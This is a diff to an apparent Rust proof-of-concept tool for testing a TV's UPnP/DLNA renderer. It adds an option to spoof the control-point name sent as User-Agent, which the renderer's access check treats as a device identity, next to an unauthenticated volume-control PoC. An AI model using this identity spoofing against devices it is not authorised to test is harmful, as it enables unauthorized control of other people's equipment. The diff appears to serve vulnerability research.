@@ -306,6 +306,29 @@ fn http_request(method: &str, url: &str, headers: &[(&str, &str)], body: &[u8])
     Ok((status, body))
 }
 
+/// `--ua`: the identity dmr hands to the RDM access check is not the MAC alone -
+/// askAclPolicy calls rdm_init_device(handle, deviceName, 0, wfdMac, lanMac,
+/// type, icon), and deviceName comes from UpnpAction::getCpDeviceName, i.e. from
+/// the control point's own request. Every call so far went out with no name at
+/// all, so this is the one identity field we have never varied.
+static mut UA: Option<String> = None;
+fn ua() -> Option<&'static String> {
+    #[allow(static_mut_refs)]
+    unsafe { UA.as_ref() }
+}
+
+/// SOAP headers, plus the control-point name when --ua was given.
+fn hdrs<'a>(soapaction: &'a str) -> Vec<(&'a str, &'a str)> {
+    let mut h = vec![
+        ("Content-Type", "text/xml; charset=\"utf-8\""),
+        ("SOAPACTION", soapaction),
+    ];
+    if let Some(u) = ua() {
+        h.push(("User-Agent", u.as_str()));
+    }
+    h
+}
+
 fn soap(ctrl: &str, ns: &str, action: &str, inner: &str) -> (u16, String) {
     let envelope = format!(
         "<?xml version=\"1.0\"?>\
@@ -320,22 +343,14 @@ s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body>\
         let (host, port, path) = (u.host.to_string(), u.port, u.path.to_string());
         return match rawtcp::http_post(
             sp, &host, port, &path,
-            &[("Content-Type", "text/xml; charset=\"utf-8\""),
-              ("SOAPACTION", &soapaction)],
+            &hdrs(&soapaction),
             envelope.as_bytes(),
         ) {
             Ok(v) => v,
             Err(e) => (0, e.to_string()),
         };
     }
-    match http_post(
-        ctrl,
-        &[
-            ("Content-Type", "text/xml; charset=\"utf-8\""),
-            ("SOAPACTION", &soapaction),
-        ],
-        envelope.as_bytes(),
-    ) {
+    match http_post(ctrl, &hdrs(&soapaction), envelope.as_bytes()) {
         Ok(v) => v,
         Err(e) => (0, e.to_string()),
     }
@@ -708,6 +723,9 @@ fn usage() {
   --dial-arg <s>     launch parameters passed to the app, e.g. \"v=<videoid>\"
   --dial-stop        DELETE <App>/run instead of launching
   --dial-port <n>    DIAL port                                 (default 8080)
+  --ua <name>        control-point name sent as User-Agent; dmr feeds this to
+                     rdm_init_device as the device name, so it is the second
+                     identity field besides the MAC
   --soap <ctrlURL>   call any UPnP action; needs --ns and --action, optional
                      --args with the inner XML
   --ssdp [ST]        M-SEARCH the LAN for UPnP devices; default ST is
@@ -813,6 +831,11 @@ fn run() {
     // --vol: the RenderingControl half of the PoC, ported from vol_poc.py so both
     // live in one binary and both can run through a spoofed identity.
     // Read the volume, set it, read it back - no auth header anywhere.
+    if let Some(name) = args.val("--ua") {
+        println!("    [UA] presenting as control point {name:?}");
+        unsafe { UA = Some(name); }
+    }
+
     if args.has("--vol") {
         let want: u16 = args.val("--set-volume").and_then(|v| v.parse().ok()).unwrap_or(6);
         println!("=== Unauthenticated RenderingControl volume PoC vs {tv_ip} (no auth header) ===");
